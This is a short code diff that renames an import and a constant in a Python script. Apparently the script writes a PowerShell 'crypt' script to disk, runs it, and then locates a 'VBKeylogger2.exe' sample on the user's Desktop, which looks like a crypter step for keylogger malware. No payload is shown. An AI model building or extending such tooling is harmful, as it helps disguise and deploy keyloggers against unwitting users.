@@ -1,6 +1,6 @@
 from subprocess import Popen
 from os import getenv, path
-from script_constants import script_constants
+from script_constants_python import script_constants
 
 
 def write_file(path: str, content: str):
@@ -22,7 +22,7 @@ def run_powershell_command(script_path: str):
 
 def main():
     script_path = "crypt.ps1"
-    write_file(script_path, script_constants.crypt)
+    write_file(script_path, script_constants.crypt_script)
     run_powershell_command(script_path)
     user_profile_path = getenv("UserProfile")
     sample_path = path.join(user_profile_path, "Desktop", "VBKeylogger2.exe")
